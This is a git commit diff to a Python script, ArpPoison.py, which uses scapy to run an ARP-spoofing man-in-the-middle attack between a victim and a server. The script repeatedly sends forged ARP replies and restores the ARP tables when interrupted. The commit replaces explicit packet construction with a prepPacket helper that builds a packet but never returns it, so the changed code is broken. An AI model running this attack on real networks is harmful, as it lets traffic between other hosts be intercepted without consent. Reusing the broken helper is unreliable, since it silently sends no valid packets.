9510fa4fe8d251e88f45982d985959083f0d10ca
WGAVermeer <90707235+WGAVermeer@users.noreply.github.com>
2023-06-10 00:38:05 +0200

    changed arp package gen

--- ArpPoison.py
+++ ArpPoison.py
@@ -18,25 +18,27 @@ def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
-    arpTo = Ether() / ARP()
-    arpTo[Ether].src = macAttacker
-    arpTo[ARP].hwsrc = macAttacker
-    arpTo[ARP].psrc = ipServer
-    arpTo[ARP].hwdst = macVictim
-    arpTo[ARP].pdst = ipVictim
+    # arpTo = Ether() / ARP()
+    # arpTo[Ether].src = macAttacker
+    # arpTo[ARP].hwsrc = macAttacker
+    # arpTo[ARP].psrc = ipServer
+    # arpTo[ARP].hwdst = macVictim
+    # arpTo[ARP].pdst = ipVictim
 
-    arpFrom = Ether() / ARP()
-    arpFrom[Ether].src = macAttacker
-    arpFrom[ARP].hwsrc = macAttacker
-    arpFrom[ARP].psrc = ipVictim
-    arpFrom[ARP].hwdst = macServer
-    arpFrom[ARP].pdst = ipServer
+    # arpFrom = Ether() / ARP()
+    # arpFrom[Ether].src = macAttacker
+    # arpFrom[ARP].hwsrc = macAttacker
+    # arpFrom[ARP].psrc = ipVictim
+    # arpFrom[ARP].hwdst = macServer
+    # arpFrom[ARP].pdst = ipServer
+    arp1 = prepPacket(macServer, ipServer, ipVictim)
+    arp2 = prepPacket(macVictim, ipVictim, ipServer)
 
     try:
         while(True):
 #             print("Poisoning Arp table")
-            sendp(arpTo, iface=interface, verbose=False)
-            sendp(arpFrom, iface=interface, verbose=False)
+            sendp(arp1, iface=interface, verbose=False)
+            sendp(arp2, iface=interface, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         undoARPSpoof(ipVictim, ipServer, macVictim, macServer)
@@ -48,6 +50,10 @@ def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
 
     sendp(undoVictim, iface=interface, count=4, verbose=False)
     sendp(undoServer, iface=interface, count=4, verbose=False)
+
+def prepPacket(targetMAC, targetIP, spoofedIP):
+    arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)
+
 
 if __name__ == "__main__":
     MIMspoofARP(ipVictim, ipServer)
